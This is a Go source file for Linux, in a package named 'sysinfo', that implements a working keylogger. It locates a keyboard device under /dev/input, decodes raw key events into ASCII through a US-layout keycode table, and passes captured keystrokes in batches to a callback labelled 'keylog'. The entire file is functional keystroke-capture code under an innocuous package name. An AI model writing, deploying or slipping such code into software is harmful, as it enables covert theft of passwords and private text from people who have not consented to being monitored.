//go:build linux
// +build linux

package sysinfo

import (
	"bytes"
	"context"
	"encoding/binary"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// input_event from linux/input.h
type inputEvent struct {
	Time  [16]byte // struct timeval (size varies, pad to 16)
	Type  uint16
	Code  uint16
	Value int32
}

const (
	evKey    = 0x01
	keyDown  = 1
)

func watchKeystrokes(ctx context.Context, onData func(data []byte, label string)) error {
	dev, err := findKeyboardDevice()
	if err != nil {
		return err
	}

	f, err := os.Open(dev)
	if err != nil {
		return fmt.Errorf("cannot open %s: %w (requires root or input group)", dev, err)
	}
	defer f.Close()

	var buf bytes.Buffer
	lastFlush := time.Now()
	eventBuf := make([]byte, 24) // sizeof(input_event) on 64-bit

	for {
		select {
		case <-ctx.Done():
			if buf.Len() > 0 {
				onData(buf.Bytes(), "keylog")
			}
			return ctx.Err()
		default:
		}

		n, err := f.Read(eventBuf)
		if err != nil {
			return err
		}
		if n < 24 {
			continue
		}

		var ev inputEvent
		binary.Read(bytes.NewReader(eventBuf[:n]), binary.LittleEndian, &ev)

		if ev.Type != evKey || ev.Value != keyDown {
			continue
		}

		ch := keycodeToChar(ev.Code)
		if ch == 0 {
			continue
		}

		if ch == '\n' || time.Since(lastFlush) > 5*time.Second {
			if buf.Len() > 0 {
				buf.WriteByte('\n')
				onData(buf.Bytes(), "keylog")
				buf.Reset()
			}
			lastFlush = time.Now()
			continue
		}

		buf.WriteByte(ch)
	}
}

func findKeyboardDevice() (string, error) {
	matches, _ := filepath.Glob("/dev/input/event*")
	for _, dev := range matches {
		name := readDeviceName(dev)
		lower := strings.ToLower(name)
		if strings.Contains(lower, "keyboard") || strings.Contains(lower, "kbd") {
			return dev, nil
		}
	}
	if len(matches) > 0 {
		return matches[0], nil
	}
	return "", fmt.Errorf("no keyboard input device found")
}

func readDeviceName(dev string) string {
	num := strings.TrimPrefix(filepath.Base(dev), "event")
	path := fmt.Sprintf("/sys/class/input/event%s/device/name", num)
	data, err := os.ReadFile(path)
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(data))
}

func keycodeToChar(code uint16) byte {
	if code < uint16(len(keycodeMap)) {
		return keycodeMap[code]
	}
	return 0
}

// keycodeMap maps Linux keycodes to ASCII characters (US layout, no modifiers).
var keycodeMap = [128]byte{
	0:  0,
	2:  '1', 3: '2', 4: '3', 5: '4', 6: '5', 7: '6', 8: '7', 9: '8', 10: '9', 11: '0',
	12: '-', 13: '=',
	14: 0, // backspace
	15: '\t',
	16: 'q', 17: 'w', 18: 'e', 19: 'r', 20: 't', 21: 'y', 22: 'u', 23: 'i', 24: 'o', 25: 'p',
	26: '[', 27: ']',
	28: '\n', // enter
	30: 'a', 31: 's', 32: 'd', 33: 'f', 34: 'g', 35: 'h', 36: 'j', 37: 'k', 38: 'l',
	39: ';', 40: '\'',
	41: '`',
	43: '\\',
	44: 'z', 45: 'x', 46: 'c', 47: 'v', 48: 'b', 49: 'n', 50: 'm',
	51: ',', 52: '.', 53: '/',
	57: ' ', // space
}
